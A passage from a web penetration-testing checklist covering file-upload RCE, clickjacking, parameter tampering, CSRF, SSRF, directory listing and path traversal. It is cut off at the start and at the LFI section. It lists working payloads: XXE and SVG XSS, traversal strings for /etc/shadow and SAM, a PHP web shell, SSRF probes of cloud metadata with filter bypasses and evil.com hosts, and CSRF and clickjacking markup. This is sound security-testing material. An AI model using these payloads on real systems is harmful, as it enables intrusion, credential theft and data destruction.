        * Trigger the shell and listen for a connection.
    
    * * *
    
    ### **9\.** **Race Condition**
    
    * **What to Do**: Try to access files during the upload process.
    
    * **Where to Test**:
        * Applications allowing simultaneous uploads or temporary file storage.
    
    * **Payloads**:
        * Malicious script as in previous examples.
    
    * **How to Confirm**:
        * Check if the file is accessible during or after the upload process.
    
    * * *
    
    ### **10\.** **Exploit Insecure File Parsing**
    
    * **What to Do**: Upload files that might be processed insecurely by the server.
    
    * **Where to Test**:
        * Applications parsing `.svg`, `.xml`, `.json`, `.csv` files.
    
    * **Payloads**:
        
        * **SVG Payload**:
            
                <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
                
            
        
        * **XML XXE Payload**:
            
                <?xml version="1.0"?>
                <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <foo>&xxe;</foo>
                
            
    
    * **How to Confirm**:
        * Check for execution or leakage of sensitive information.
    
    * * *
    
    ### **Steps to Confirm RCE**
    
    1.  Upload the file using the above techniques.
    
    2.  Access the uploaded file‚Äôs URL.
    
    3.  Test the execution by appending commands to the URL (e.g., `?cmd=id`).
    
    4.  Verify output, reverse shell, or code execution.
    

* **Clickjacking**
    
    ### **Clickjacking Test Cases Checklist**
    
    Clickjacking vulnerabilities occur when an attacker tricks users into interacting with hidden elements of a legitimate website by embedding it into an iframe or similar mechanisms. Below is a structured checklist for testing Clickjacking vulnerabilities:
    
    * * *
    
    ### **1****. General Testing**
    
    * Verify if the website can be embedded within an `<iframe>` tag on another domain.
        
    
    * Test by embedding the page in an HTML file with the following structure:
        
            <iframe src="http://example.com" width="800" height="600"></iframe>
            
        
    
    * Check if sensitive actions (e.g., login, payment) can be triggered within the iframe.
        
    
    * * *
    
    ### **2\.** **X-Frame-Options Header Validation**
    
    * Verify if the `X-Frame-Options` header is set.
        
    
    * Test common values for `X-Frame-Options`:
        
        * **DENY**: The page cannot be displayed in an iframe.
        
        * **SAMEORIGIN**: The page can only be displayed in an iframe on the same origin.
        
    
    * Use tools like browser developer tools or Burp Suite to inspect the response headers.
        
    
    * * *
    
    ### **3\.** **Content Security Policy (CSP) Validation**
    
    * Check if the site uses a `Content-Security-Policy` header with the `frame-ancestors` directive.
        
    
    * Verify the directive is correctly configured:
        
        * Example: `Content-Security-Policy: frame-ancestors 'self';`
        
    
    * Test for misconfigurations (e.g., allowing unsafe origins).
        
    
    * * *
    
    ### **4\.** **Transparent Overlays**
    
    * Test if transparent elements can be overlaid on legitimate elements in an iframe.
        
    
    * Create a malicious HTML page with a transparent iframe:
        
            <iframe src="http://example.com" style="opacity: 0.1; pointer-events: none;" width="800" height="600"></iframe>
            
        
    
    * Check if the user can unknowingly interact with the embedded page.
        
    
    * * *
    
    ### **5\.** **Sensitive Actions**
    
    * Test clickjacking on sensitive pages or functionalities:
        
        * Login pages
        
        * Payment portals
        
        * Account settings (e.g., password change, email update)
        
        * One-click buttons (e.g., "Buy Now", "Subscribe")
        
    
    * Simulate a click on the iframe to confirm if the action is executed.
        
    
    * * *
    
    ### **6\.** **Frame Busting**
    
    * Verify if the site implements JavaScript-based frame-busting code to prevent embedding:
        
        * Example:
            
                if (window.top !== window.self) {
                  window.top.location = window.self.location;
                }
                
            
        
    
    * Test if frame-busting can be bypassed by disabling JavaScript in the browser.
        
    
    * * *
    
    ### **7\.** **Multiple Browser Tests**
    
    * Test the behavior across different browsers (e.g., Chrome, Firefox, Edge).
        
    
    * Verify the impact on both desktop and mobile browsers.
        
    
    * * *
    
    ### **8\.** **UI Redressing**
    
    * Simulate clickjacking attacks using CSS to obscure legitimate elements:
        
            <iframe src="http://example.com" style="z-index: 1;"></iframe>
            <button style="z-index: 2; position: absolute; top: 50px; left: 50px;">Click Me</button>
            
        
    
    * Check if attackers can create deceptive UI overlays to trick users into interacting with hidden elements.
        
    
    * * *
    
    ### **9\.** **Third-Party Integrations**
    
    * Verify if third-party widgets or integrations (e.g., payment gateways, authentication providers) are protected against clickjacking.
        
    
    * Test if embedded components allow framing by external domains.
        
    
    * * *
    
    ### **10\.** **Tools for Automation**
    
    * Use tools like:
        
        * Burp Suite: To inspect headers and iframe behavior.
        
        * OWASP ZAP: For automated testing of clickjacking vulnerabilities.
        
        * Browser DevTools: To manually inspect iframe embedding and headers.
        
    
    * * *
    
    ### **11\.** **Mitigation Testing**
    
    * Validate if the website correctly prevents framing:
        
        * Ensure `X-Frame-Options` or `CSP` is consistently applied across all pages.
        
        * Test if JavaScript-based frame-busting logic works as intended.
        
    
    * Check if the headers or frame-busting logic applies to:
        
        * Error pages
        
        * Static pages
        
        * Legacy subdomains
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**: The page cannot be embedded in an iframe or executes no sensitive action when embedded.
    
    * **Vulnerable**: The page is successfully embedded in an iframe and allows users to interact with sensitive functionalities without their knowledge.
    

* **Parameter Manipulation**
    
    ### **Parameter Manipulation Testing Checklist**
    
    Parameter manipulation vulnerabilities occur when attackers tamper with client-supplied parameters to manipulate application behavior, gain unauthorized access, or extract sensitive data. Here's a detailed checklist of **where to test** and **how to test** for parameter manipulation vulnerabilities.
    
    * * *
    
    ### **1\.** **Query Parameters**
    
    * **Where to Test**:
        
        * URLs with query strings (e.g., `http://example.com/product?id=123&price=50`)
        
        * APIs with parameters in the request URL.
        
    
    * **What to Test**:
        
        * Change numeric parameters (e.g., `id=123` to `id=456`) to access unauthorized resources.
        
        * Modify sensitive parameters (e.g., `price=50` to `price=1`).
        
        * Remove optional parameters and observe behavior.
        
        * Inject special characters (`', ", <, >`) to test for SQL Injection or XSS.
        
    
    * * *
    
    ### **2\.** **Form Parameters**
    
    * **Where to Test**:
        
        * HTML forms with `POST` or `GET` methods.
        
    
    * **What to Test**:
        
        * Change field values (e.g., `quantity=1` to `quantity=999`).
        
        * Tamper hidden fields (e.g., `<input type="hidden" name="role" value="user">` to `value="admin"`).
        
        * Modify optional parameters to unexpected values.
        
        * Inject malicious payloads into form fields to test for SQL Injection or XSS.
        
    
    * * *
    
    ### **3\.** **HTTP Headers**
    
    * **Where to Test**:
        
        * Custom headers like `Authorization`, `Referer`, `User-Agent`, `X-Forwarded-For`.
        
    
    * **What to Test**:
        
        * Tamper the `Authorization` header to access resources as another user.
        
        * Modify the `X-Forwarded-For` header to spoof IP addresses.
        
        * Change the `Referer` header to bypass referrer-based access control.
        
        * Test the `User-Agent` header for logging-related issues.
        
    
    * * *
    
    ### **4\.** **Cookie Parameters**
    
    * **Where to Test**:
        
        * Cookies storing session tokens, preferences, or user roles.
        
    
    * **What to Test**:
        
        * Modify session cookies to impersonate another user.
        
        * Change values in encrypted or encoded cookies.
        
        * Delete optional cookies and observe application behavior.
        
        * Inject malicious payloads to test for server-side vulnerabilities (e.g., SQL Injection).
        
    
    * * *
    
    ### **5\.** **JSON/XML API Parameters**
    
    * **Where to Test**:
        
        * APIs accepting JSON or XML payloads.
        
    
    * **What to Test**:
        
        * Modify numeric parameters in the payload (e.g., `{"userId": 123}` to `{"userId": 456}`).
        
        * Add unexpected keys or values to the payload.
        
        * Change boolean flags (e.g., `isAdmin: false` to `isAdmin: true`).
        
        * Inject malicious payloads into JSON/XML fields.
        
        * Test XML-based parameters for XXE vulnerabilities.
        
    
    * * *
    
    ### **6\.** **URL Path Parameters**
    
    * **Where to Test**:
        
        * RESTful APIs or pages using URL paths (e.g., `/user/123/orders`).
        
    
    * **What to Test**:
        
        * Change identifiers in the path (e.g., `/user/123` to `/user/456`) to test access controls.
        
        * Inject special characters or malicious payloads in the path (e.g., `/user/123%00`).
        
        * Test removing or truncating parts of the URL.
        
    
    * * *
    
    ### **7\.** **Session Parameters**
    
    * **Where to Test**:
        
        * Session-related tokens passed in cookies, headers, or URL parameters.
        
    
    * **What to Test**:
        
        * Modify session IDs to hijack or impersonate another session.
        
        * Test for predictable session tokens.
        
        * Replay valid sessions after logout to check for invalidation.
        
    
    * * *
    
    ### **8\.** **Hidden Fields**
    
    * **Where to Test**:
        
        * Forms with hidden input fields (e.g., `<input type="hidden" name="userRole" value="user">`).
        
    
    * **What to Test**:
        
        * Modify hidden field values to escalate privileges (e.g., `value="user"` to `value="admin"`).
        
        * Remove the hidden field and observe behavior.
        
        * Inject malicious payloads into hidden fields.
        
    
    * * *
    
    ### **9\.** **File Upload Parameters**
    
    * **Where to Test**:
        
        * Forms or APIs that allow file uploads.
        
    
    * **What to Test**:
        
        * Modify file names or paths in the request.
        
        * Change `Content-Type` to bypass validation.
        
        * Inject malicious payloads into file metadata (e.g., EXIF data).
        
        * Test size and type restrictions.
        
    
    * * *
    
    ### **10\.** **Pagination and Sorting Parameters**
    
    * **Where to Test**:
        
        * Pages or APIs using parameters like `page`, `limit`, `sort`, or `order`.
        
    
    * **What to Test**:
        
        * Change `limit` to an excessively large value (e.g., `limit=10000`).
        
        * Modify `sort` or `order` values to unexpected strings (e.g., `sort=invalid`).
        
        * Access pages or data outside the intended range (e.g., `page=-1`).
        
    
    * * *
    
    ### **11\.** **Price/Transaction Parameters**
    
    * **Where to Test**:
        
        * Checkout forms or transaction APIs.
        
    
    * **What to Test**:
        
        * Reduce the price value (e.g., `price=100` to `price=1`).
        
        * Tamper with discount codes or promotional parameters.
        
        * Modify currency or tax-related fields.
        
    
    * * *
    
    ### **12\.** **Boolean Flags**
    
    * **Where to Test**:
        
        * Parameters controlling feature toggles (e.g., `isAdmin`, `isPremium`).
        
    
    * **What to Test**:
        
        * Change boolean flags to unauthorized values (e.g., `isAdmin=false` to `isAdmin=true`).
        
    
    * * *
    
    ### **13\.** **OAuth/SSO Parameters**
    
    * **Where to Test**:
        
        * OAuth redirects, tokens, or SSO workflows.
        
    
    * **What to Test**:
        
        * Modify `redirect_uri` to point to an attacker-controlled domain.
        
        * Change `client_id` to impersonate another application.
        
        * Inject malicious payloads into OAuth state or nonce parameters.
        
    
    * * *
    
    ### **Tools for Parameter Manipulation**
    
    * **Manual Tools**:
        
        * Browser Developer Tools
        
        * Postman (API testing)
    
    * **Automation**:
        
        * Burp Suite (Intruder/Repeater for parameter tampering)
        
        * OWASP ZAP
        
        * Fiddler
    
    * **Payload Generators**:
        * SecLists for common test payloads.
    
    * * *
    

* **Cross-Site Request Forgery (** CSRF )
    
    **Cross-Site Request Forgery (CSRF)** vulnerabilities occur when an attacker tricks a victim into performing an unintended action on a web application where they are authenticated. Below is a comprehensive checklist for identifying CSRF vulnerabilities and techniques to bypass CSRF protections.
    
    * * *
    
    ### **CSRF Testing Checklist**
    
    ### **1\.** **Identify CSRF-Prone Actions**
    
    * **Where to Test**:
        
        * Sensitive actions:
            
            * Changing account passwords
            
            * Updating email addresses or payment details
            
            * Deleting or modifying resources
            
            * Transactions or purchases
        
    
    * **What to Test**:
        
        * Any action requiring user authentication.
        
    
    * * *
    
    ### **2\.** **Test Without CSRF Token**
    
    * **Where to Test**:
        
        * Forms, API requests, and AJAX endpoints.
        
    
    * **What to Do**:
        
        * Remove the CSRF token from the request and check if the action still succeeds.
        
        * Tools: Burp Suite Repeater, OWASP ZAP.
        
    
    * * *
    
    ### **3\.** **Test with Invalid CSRF Token**
    
    * **Where to Test**:
        
        * Forms or headers with CSRF tokens.
        
    
    * **What to Do**:
        
        * Replace the valid token with an invalid one (e.g., `csrf_token=invalid`).
        
        * Observe if the request is accepted or rejected.
        
    
    * * *
    
    ### **4.** **Test for Token Reuse**
    
    * **Where to Test**:
        
        * Pages or forms with CSRF tokens.
        
    
    * **What to Do**:
        
        * Use the same token for multiple requests and check if it works repeatedly.
        
        * Confirm if tokens are unique per session or per request.
        
    
    * * *
    
    ### **5\.** **Check Referrer Header**
    
    * **Where to Test**:
        
        * Applications using the `Referer` header for CSRF protection.
        
    
    * **What to Do**:
        
        * Spoof the `Referer` header using tools like Burp Suite.
        
        * Check if the action succeeds with a fake `Referer`.
        
    
    * * *
    
    ### **6\.** **Test with Cookies**
    
    * **Where to Test**:
        
        * Applications using cookies for session management.
        
    
    * **What to Do**:
        
        * Craft a malicious request using the victim's cookies (using a browser extension or a tool).
        
        * Test if the action executes successfully without additional verification.
        
    
    * * *
    
    ### **7\.** **HTTP Method Manipulation**
    
    * **Where to Test**:
        
        * Actions requiring specific HTTP methods (e.g., `POST`, `PUT`, `DELETE`).
        
    
    * **What to Do**:
        
        * Change the method (e.g., `GET` instead of `POST`) and check if the action still succeeds.
        
    
    * * *
    
    ### **8\.** **Test for SameSite Cookie Protections**
    
    * **Where to Test**:
        
        * Applications relying on cookies for authentication.
        
    
    * **What to Do**:
        
        * Check if the `SameSite` attribute is properly set (`Strict` or `Lax`).
        
        * Tools: Browser developer tools or Burp Suite.
        
    
    * * *
    
    ### **9\.** **CORS Misconfigurations**
    
    * **Where to Test**:
        
        * Applications using Cross-Origin Resource Sharing (CORS).
        
    
    * **What to Do**:
        
        * Test if the application allows cross-origin requests without validating the `Origin` header.
        
    
    * * *
    
    ### **10\.** **Custom Header Validation**
    
    * **Where to Test**:
        
        * APIs or endpoints expecting custom headers for CSRF protection.
        
    
    * **What to Do**:
        
        * Remove or modify the custom header and check if the request succeeds.
        
    
    * * *
    
    ### **CSRF Bypass Techniques**
    
    ### **1\.** **Missing or Weak Token Validation**
    
    * **Technique**:
        
        * Omit the CSRF token or use an invalid token.
        
        * Tools: Burp Suite, Postman.
        
    
    * **Why It Works**:
        * The server may not validate the token properly.
    
    * * *
    
    ### **2\.** **Token Reuse**
    
    * **Technique**:
        
        * Reuse a token obtained from a previous legitimate request.
        
    
    * **Why It Works**:
        * Some applications allow the same token to be used repeatedly.
    
    * * *
    
    ### **3\.** **Token in GET Request**
    
    * **Technique**:
        
        * If the token is included in a URL parameter, embed the link in a malicious email or webpage.
        
        * Example:
            
                <img src="http://example.com/change-email?csrf_token=123&email=attacker@example.com">
                
            
        
    
    * **Why It Works**:
        * The token is exposed in the URL, making it easy to manipulate.
    
    * * *
    
    ### **4\.** **HTTP Header Manipulation**
    
    * **Technique**:
        
        * Spoof or omit headers like `Referer` or `Origin`.
        
    
    * **Why It Works**:
        * If the application relies on these headers, improper validation can be bypassed.
    
    * * *
    
    ### **5\.** **SameSite Cookie Misconfiguration**
    
    * **Technique**:
        
        * Exploit cookies without the `SameSite` attribute.
        
        * Craft a malicious request from a different domain.
        
    
    * **Why It Works**:
        * The browser sends cookies to the vulnerable application.
    
    * * *
    
    ### **6\.** **CORS Exploitation**
    
    * **Technique**:
        
        * Exploit misconfigured CORS policies to send authenticated requests from another origin.
        
    
    * **Why It Works**:
        * If `Access-Control-Allow-Origin: *` is set, the server accepts cross-origin requests.
    
    * * *
    
    ### **7\.** **Clickjacking**
    
    * **Technique**:
        
        * Embed the target page in an iframe and overlay deceptive UI elements.
        
        * Example:
            
                <iframe src="http://example.com/change-password" style="opacity: 0;"></iframe>
                <button onclick="document.querySelector('iframe').contentWindow.document.getElementById('submit').click();">Click Here</button>
                
            
        
    
    * **Why It Works**:
        * The user unknowingly performs the action.
    
    * * *
    
    ### **8\.** **JSON/Custom Content-Type Payloads**
    
    * **Technique**:
        
        * Change the `Content-Type` header to `application/json` or similar formats.
        
        * Example:
            
                {"action":"delete","csrf_token":"123"}
                
            
        
    
    * **Why It Works**:
        * Some servers fail to validate tokens for non-form submissions.
    
    * * *
    
    ### **Tools for Testing CSRF**
    
    * **Manual**:
        
        * Burp Suite Repeater
        
        * Postman
    
    * **Automated**:
        
        * OWASP ZAP (Active Scan Rules)
        
        * CSRF PoC Generator (Burp Suite extension)
    
    * **Browser Extensions**:
        * HackBar (for crafting requests)
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * Actions requiring user authentication are protected by unique, validated CSRF tokens.
        
        * Tokens are non-reusable, tied to the session, and validated server-side.
    
    * **Vulnerable**:
        * Actions succeed without a valid CSRF token or proper validation.
    

* **Server-Side Request Forgery ( SSRF )**
    
    ### **Server-Side Request Forgery (SSRF)**
    
    **SSRF vulnerabilities** occur when an attacker can manipulate server-side requests to unintended or malicious destinations. Below is a comprehensive checklist for testing SSRF and exploring what can be achieved once it's discovered.
    
    * * *
    
    ### **1.** **Identify Input Points**
    
    * **Where to Test**:
        
        * URL parameters accepting external links.
        
        * API endpoints taking URLs as input.
        
        * File upload functions downloading files from URLs.
        
        * Webhooks or integrations fetching data from user-supplied URLs.
        
        * Image preview or resizing functionality.
        
        * Redirect or forwarding features.
        
    
    * * *
    
    ### **2\.** **Test Basic SSRF Payloads**
    
    * **What to Do**:
        
        * Provide external URLs:
            
            * `http://example.com`
            
            * `http://evil.com`
        
        * Observe server responses for:
            
            * Network errors.
            
            * Connection timeouts.
            
            * Server-side content returned in the response.
        
    
    * * *
    
    ### **3\.** **Test for Internal Network Access**
    
    * **What to Do**:
        
        * Probe internal IP ranges to access restricted resources:
            
            * `http://127.0.0.1`
            
            * `http://192.168.1.1`
            
            * `http://10.0.0.1`
        
        * Check for:
            
            * Application interfaces.
            
            * Internal APIs.
            
            * Unauthorized resources like admin panels.
        
    
    * * *
    
    ### **4\.** **Test for Localhost Access**
    
    * **What to Do**:
        
        * Try accessing localhost services:
            
            * `http://127.0.0.1:80`
            
            * `http://localhost:8080`
        
        * Common services to test:
            
            * HTTP servers (`http://127.0.0.1:80`)
            
            * Database endpoints (`http://127.0.0.1:3306`)
            
            * Cloud metadata services:
                
                * AWS: `http://169.254.169.254/latest/meta-data/`
                
                * GCP: `http://metadata.google.internal/`
                
                * Azure: `http://169.254.169.254/metadata/instance`
        
    
    * * *
    
    ### **5\.** **Test for File Protocol**
    
    * **What to Do**:
        
        * Inject `file://` to read server files:
            
            * `file:///etc/passwd`
            
            * `file:///C:/Windows/System32/drivers/etc/hosts`
        
        * Observe if file contents are returned in the response.
        
    
    * * *
    
    ### **6\.** **Test for Other Protocols**
    
    * **What to Do**:
        
        * Try alternative protocols:
            
            * FTP: `ftp://ftp.example.com`
            
            * SMB: `smb://127.0.0.1/share`
            
            * Gopher: `gopher://127.0.0.1`
        
        * Check if the server connects to these protocols.
        
    
    * * *
    
    ### **7\.** **Test for DNS Exfiltration**
    
    * **What to Do**:
        
        * Use a DNS logging service (e.g., `burpcollaborator.net`) to verify if the server resolves attacker-controlled domains.
        
        * Payloads:
            
            * `http://yourdomain.burpcollaborator.net`
            
            * `http://subdomain.yourdomain.burpcollaborator.net`
        
        * Observe DNS logs for resolution attempts.
        
    
    * * *
    
    ### **8\.** **Test for Port Scanning**
    
    * **What to Do**:
        
        * Probe common ports on internal IPs:
            
            * `http://127.0.0.1:22` (SSH)
            
            * `http://127.0.0.1:80` (HTTP)
            
            * `http://127.0.0.1:3306` (MySQL)
        
        * Observe response differences:
            
            * Connection refused.
            
            * Connection timeouts.
            
            * Successful responses.
        
    
    * * *
    
    ### **9\.** **Test for Response Manipulation**
    
    * **What to Do**:
        
        * Inject a malicious response into the server:
            
            * Set up a server returning crafted data (e.g., HTTP headers or scripts).
            
            * Example: `http://evil.com/malicious`
        
        * Check if the application processes or renders the attacker‚Äôs response.
        
    
    * * *
    
    ### **10\.** **Bypass Protections**
    
    ### **a. URL Encoding**
    
    * Encode payloads to bypass filters:
        
        * `%2e%2e%2f` for `../`
        
        * `%25%32%65` for `%2e`
        
    
    ### **b. Open Redirect**
    
    * Leverage open redirects to bypass filters:
        
        * Example: `http://trusted.com/redirect?url=http://evil.com`
        
    
    ### **c. Alternate IP Representations**
    
    * Test different representations of IP addresses:
        
        * Decimal: `2130706433` for `127.0.0.1`
        
        * Octal: `0177.0.0.1`
        
        * Hexadecimal: `0x7F000001`
        
    
    ### **d. Null Bytes**
    
    * Use null bytes to truncate validation:
        
        * `http://127.0.0.1%00.evil.com`
        
    
    * * *
    
    ### **11\.** **Tools for Automating SSRF Testing**
    
    * **Manual**:
        
        * Burp Suite Repeater (to modify requests)
        
        * Postman (for API testing)
    
    * **Automated**:
        
        * OWASP ZAP (Active scan rules for SSRF)
        
        * SSRFMap (tool for testing various SSRF payloads)
        
        * Collaborator Everywhere (Burp extension for DNS exfiltration)
    
    * * *
    
    ### **What You Can Achieve with SSRF**
    
    1.  **Internal Reconnaissance**:
        
        * Scan internal services and resources.
        
        * Access admin panels or internal APIs.
    
    2.  **Cloud Metadata Access**:
        * Extract sensitive credentials (e.g., AWS access keys).
    
    3.  **File Access**:
        * Read sensitive server files using the `file://` protocol.
    
    4.  **Privilege Escalation**:
        * Exploit other services on the localhost (e.g., Redis, Elasticsearch).
    
    5.  **Data Exfiltration**:
        * Use DNS queries to exfiltrate sensitive information.
    
    6.  **Service Abuse**:
        * Interact with internal services (e.g., triggering actions via APIs).
    
    * * *
    
    ### **Mitigation Testing**
    
    * Check if the application validates and restricts user-supplied URLs.
        
    
    * Verify that internal IPs and localhost are inaccessible.
        
    
    * Ensure proper sanitization and whitelisting for accepted domains.
        
    
    * Block unused protocols like `file://`, `ftp://`, `gopher://`.
        
    
    * * *
    

* **Directory Listing**
    
    ### **Directory Listing**
    
    Directory listing vulnerabilities occur when a web server allows users to view a directory's contents. This can expose sensitive files, configurations, or source code. Below is a checklist for testing directory listing vulnerabilities and the additional actions to take if discovered.
    
    * * *
    
    ### **1\.** **Identify Testable Directories**
    
    * **Where to Test**:
        
        * Root directory: `/`
        
        * Subdirectories (e.g., `/admin/`, `/backup/`, `/uploads/`)
        
        * Common directories:
            
            * `/images/`, `/css/`, `/js/`
            
            * `/config/`, `/logs/`, `/temp/`, `/backup/`
            
            * `/dev/`, `/staging/`, `/test/`
        
    
    * * *
    
    ### **2\.** **Access Directory URLs Directly**
    
    * **What to Do**:
        
        * Enter the directory URL directly in the browser or tool:
            
            * `http://example.com/admin/`
            
            * `http://example.com/uploads/`
        
        * Observe if the directory listing is displayed.
        
    
    * * *
    
    ### **3\.** **Use Automated Tools**
    
    * **What to Use**:
        
        * Dirb/Dirbuster:
            
                dirb http://example.com
                
            
        
        * Gobuster:
            
                gobuster dir -u http://example.com -w /path/to/wordlist.txt
                
            
        
        * Burp Suite (Intruder):
            * Use common directory wordlists to brute force directories.
        
    
    * * *
    
    ### **4\.** **Look for Exposed Files**
    
    * **What to Search For**:
        
        * Sensitive files:
            * `.env`, `.htaccess`, `.git`, `.DS_Store`
        
        * Configuration files:
            * `config.php`, `web.config`, `application.yml`
        
        * Logs:
            * `error.log`, `access.log`, `debug.log`
        
        * Backup files:
            * `database.sql`, `backup.zip`, `config.bak`
        
    
    * * *
    
    ### **5\.** **Test for Restricted Access**
    
    * **What to Do**:
        
        * Access directories that should be restricted:
            
            * `/admin/`
            
            * `/private/`
            
            * `/secure/`
        
        * Observe if the directory listing or sensitive files are exposed.
        
    
    * * *
    
    ### **6\.** **Inspect Directory Indexing**
    
    * **What to Do**:
        
        * Look for server-generated directory listings:
            
            * Apache:
                
                    Index of /path/
                    
                
            
            * Nginx:
                
                    autoindex on
                    
                
            
            * IIS:
                
                    Directory Listing Denied
                    
                
        
    
    * **What to Observe**:
        
        * File names, sizes, and modification dates.
        
        * Hidden files or directories (e.g., `.git/`, `.svn/`).
        
    
    * * *
    
    ### **7\.** **Test for Path Traversal**
    
    * **What to Do**:
        
        * Inject path traversal payloads into the URL:
            * `../`, `../../`, `%2e%2e/`, `%2e%2e%2f`
        
        * Example:
            * `http://example.com/images/../../etc/passwd`
        
        * Observe if unauthorized files are accessed.
        
    
    * * *
    
    ### **8\.** **Leverage Directory Listing**
    
    If directory listing is enabled, test the following:
    
    * **Sensitive Information Retrieval**:
        
        * Download exposed configuration, database, or backup files.
        
    
    * **Source Code Access**:
        
        * Review `.php`, `.js`, `.html`, or other files for hardcoded credentials or vulnerabilities.
        
    
    * **Log Analysis**:
        
        * Look for API keys, passwords, or sensitive details in log files.
        
    
    * **File Upload Testing**:
        
        * If the directory is writable, attempt to upload files.
        
    
    * * *
    
    ### **9\.** **Exploit Directory Listing for Further Testing**
    
    * **Enumeration**:
        
        * Use directory contents to enumerate available files and applications.
        
    
    * **Pivot to Other Vulnerabilities**:
        
        * Identify files that might lead to further vulnerabilities:
            
            * `.env` files for credentials.
            
            * Database backups for SQL injection.
            
            * Log files for error-based information disclosure.
        
    
    * * *
    
    ### **10\.** **Tools for Directory Listing Testing**
    
    * **Manual**:
        
        * Browser navigation
        
        * Curl/Wget:
            
                curl -I http://example.com/uploads/
                
            
    
    * **Automated**:
        * Dirb, Gobuster, OWASP ZAP, Burp Suite.
    
    * **Custom Scripts**:
        * Use Python or Bash scripts to brute-force and enumerate directories.
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        
        * Directories return `403 Forbidden` or `404 Not Found` when accessed directly.
        
        * No directory listings or sensitive files are exposed.
    
    * **Vulnerable**:
        
        * Directories display file listings.
        
        * Sensitive files are accessible.
    
    * * *
    
    ### **Mitigation Testing**
    
    * Verify that directory indexing is disabled:
        
        * Apache: `Options -Indexes`
        
        * Nginx: `autoindex off;`
        
        * IIS: Disable "Directory Browsing" in the configuration.
        
    
    * Ensure proper access controls for sensitive directories.
        
    
    * Validate that sensitive files are not stored in web-accessible locations.
        
    
    * * *
    

* **Path Traversal**
    
    ### **Path Traversal Vulnerability**
    
    **Path Traversal vulnerabilities** occur when user inputs are improperly validated, allowing attackers to access files or directories outside the intended scope. This can expose sensitive data or enable further exploitation.
    
    * * *
    
    ### **1\.** **Identify Input Points**
    
    * **Where to Test**:
        
        * File inclusion endpoints (e.g., `GET /file?name=file.txt`).
        
        * File upload or download functions.
        
        * Error pages revealing file paths.
        
        * Logs or debugging tools.
        
        * Any parameter taking a file path or resource location.
        
    
    * **Common Parameters**:
        
        * `file`, `path`, `dir`, `template`, `include`, `download`, `image`, `document`.
        
    
    * * *
    
    ### **2\.** **Basic Payloads**
    
    * Inject common traversal sequences:
        
        * `../`, `..%2f`, `..%5c`, `%2e%2e%2f`, `%252e%252e%252f`
        
    
    * **Examples**:
        
        * `GET /file?name=../../../../etc/passwd`
        
        * `GET /file?path=..%2f..%2f..%2f..%2fetc%2fpasswd`
        
        * `GET /file?file=C:\Windows\System32\drivers\etc\hosts`
        
    
    * * *
    
    ### **3\.** **Target Sensitive Files**
    
    * **Linux Systems**:
        
        * `/etc/passwd` (user information)
        
        * `/etc/shadow` (password hashes, if readable)
        
        * `/var/log/` (logs for sensitive info)
        
        * `/root/` (root user's directory)
        
    
    * **Windows Systems**:
        
        * `C:\Windows\System32\drivers\etc\hosts`
        
        * `C:\boot.ini` (boot configuration)
        
        * `C:\Windows\System32\config\SAM` (user account database)
        
    
    * * *
    
    ### **4.** **Bypass Input Validation**
    
    * **Encodings**:
        
        * URL encoding: `%2e%2e%2f`
        
        * Double URL encoding: `%252e%252e%252f`
        
        * Unicode encoding: `..%u2216` or `..%c0%af`
        
    
    * **Nested Encodings**:
        
        * Try double or triple encodings (e.g., `%25%32%65` for `%2e`).
        
    
    * **Null Bytes**:
        
        * Append `%00` to truncate validation:
            * `../../../../etc/passwd%00`
        
    
    * **Case Variations**:
        
        * Use mixed or upper-case characters:
            * `..//..//..//..//EtC/PaSsWd`
        
    
    * * *
    
    ### **5\.** **Exploit Path Traversal**
    
    * **Access Source Code**:
        
        * Download files like `.php`, `.html`, or `.js`:
            * `GET /file?name=../../../../var/www/html/index.php`
        
    
    * **Access Configuration Files**:
        
        * Retrieve files like `.env` for sensitive keys and credentials:
            * `GET /file?name=../../../../.env`
        
    
    * **Log Files**:
        
        * Access server logs for debugging information:
            * `GET /file?name=../../../../var/log/apache2/access.log`
        
    
    * * *
    
    ### **6\.** **Test for Writable Directories**
    
    * **What to Do**:
        
        * Attempt to write files in directories:
            
            * Payload: `../../../../var/www/html/shell.php`
            
            * PHP Web Shell:
                
                    <?php system($_GET['cmd']); ?>
                    
                
        
        * Access the uploaded file:
            * `GET /uploads/shell.php?cmd=id`
        
    
    * * *
    
    ### **7\.** **File Deletion**
    
    * **What to Do**:
        
        * Attempt to delete files or overwrite critical files using the traversal path.
        
        * Examples:
            * `GET /delete?file=../../../../var/www/html/index.php`
        
    
    * * *
    
    ### **8\.** **Detect Error Messages**
    
    * **What to Look For**:
        
        * Errors revealing file paths or directory structures:
            
            * `File not found: /etc/passwd`
            
            * `No such file or directory: C:\Windows\System32\drivers\etc\hosts`
        
    
    * * *
    
    ### **9\.** **Test for Relative Path Injection**
    
    * **What to Do**:
        
        * Combine traversal payloads with expected file names:
            
            * `../../../../etc/passwd%00file.txt`
            
            * `../../../secret/hiddenfile.txt`
        
    
    * * *
    
    ### **10\.** **Tools for Path Traversal Testing**
    
    * **Manual Testing**:
        
        * Burp Suite (Repeater for injecting payloads)
        
        * Postman (for API testing)
    
    * **Automated Tools**:
        
        * OWASP ZAP (Path Traversal plugin)
        
        * Nikto
        
        * Dirb/Gobuster
    
    * **Custom Scripts**:
        * Use Python or Bash scripts to automate path traversal payloads.
    
    * * *
    
    ### **11\.** **Mitigation Testing**
    
    * **Check Path Validation**:
        
        * Ensure the application normalizes paths before using them.
        
    
    * **Use Secure APIs**:
        
        * Test if the application uses secure file handling functions (e.g., no raw `file_get_contents` or `open` calls).
        
    
    * **Check Permissions**:
        
        * Verify that the application has restricted file access permissions.
        
    
    * * *
    
    ### **Expected Outcomes**
    
    * **Secure**:
        * The server rejects traversal attempts and limits file access to intended directories.
    
    * **Vulnerable**:
        * Traversal payloads access or modify files outside the intended directory.
    

* **LFI and RFI**
    
    ### **Local File Inclusion (LFI) and Remote File Inclusion (RFI)**
    
    **LFI** allows attackers to include files from the local file system of the server.
    
    **RFI** allows attackers to include files from external sources.
    
    * * *
    
    ### **LFI Testing Checklist**
    
    ### **1.** **Identify Input Points**
    
    * **Where to Test**:
        
        * Parameters that handle file paths:
            * `?file=`, `?page=`, `?template=`, `?include=`
        
        * Form fields or API endpoints accepting file names.
        
    
    * * *
    
    ### **2\.** **Basic LFI Payloads**
    
